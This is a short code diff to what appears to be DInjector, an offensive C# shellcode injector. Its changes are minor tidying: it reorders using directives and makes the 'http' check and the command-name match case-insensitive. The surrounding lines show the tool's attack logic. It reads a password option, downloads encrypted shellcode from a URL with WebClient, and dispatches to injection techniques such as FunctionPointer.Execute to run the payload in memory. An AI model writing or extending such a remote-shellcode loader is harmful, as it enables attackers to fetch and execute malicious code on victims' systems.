@@ -1,10 +1,11 @@
 ﻿using System;
 using System.IO;
 using System.Net;
+using System.Linq;
 using System.Diagnostics;
+using System.Globalization;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
-using System.Linq;
 
 namespace DInjector
 {
@@ -111,7 +112,7 @@ namespace DInjector
             var password = options["/password"];
 
             byte[] shellcodeEncrypted;
-            if (shellcodePath.IndexOf("http", StringComparison.OrdinalIgnoreCase) >= 0)
+            if (shellcodePath.StartsWith("http", ignoreCase: true, culture: new CultureInfo("en-US")))
             {
                 Console.WriteLine("(Detonator) [*] Loading shellcode from URL");
                 WebClient wc = new WebClient();
@@ -146,7 +147,7 @@ namespace DInjector
             catch (Exception)
             { }
 
-            switch (commandName)
+            switch (commandName.ToLower())
             {
                 case "functionpointer":
                     FunctionPointer.Execute(shellcodeBytes);
